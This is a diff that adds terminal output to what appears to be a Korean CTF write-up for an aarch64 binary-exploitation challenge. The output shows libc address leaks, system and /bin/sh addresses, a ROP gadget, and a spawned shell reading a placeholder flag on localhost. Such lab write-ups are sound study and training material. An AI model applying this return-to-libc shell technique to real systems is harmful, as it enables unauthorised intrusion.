@@ -450,6 +450,38 @@ sla(b'> ', pay)
 p.interactive()
 ```
 
+```bash
+bankai@bankai:~/Backups_/pwn/dreamhack_/Leg2$ ./ex.py 
+[*] '/home/bankai/Backups_/pwn/dreamhack_/Leg2/chal'
+    Arch:       aarch64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    Stripped:   No
+[◐] Opening connection to localhost on port 8000: TryiOpening connection to localhost on port 8000: [+] 
+[*] '/home/bankai/Backups_/pwn/dreamhack_/Leg2/libc.so'
+    Arch:       aarch64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+[*] leak: 0xffffbd7b2f4c
+[*] libc_base: 0xffffbd76c000
+[*] system: 0xffffbd7aa9b4
+[*] /bin/sh: 0xffffbd7fe87a
+[*] gadget: 0xffffbd7a7ac0
+[*] Switching to interactive mode
+$ cat flag
+DH{this_is_a_flag}
+$ id
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+$ 
+[*] Interrupted
+[*] Closed connection to localhost port 8000
+bankai@bankai:~/Backups_/pwn/dreamhack_/Leg2$ 
+```
+
 ---
 +PS)
 다른 롸업 정리하다 이거 쓰는 걸 잊어버렸다.  
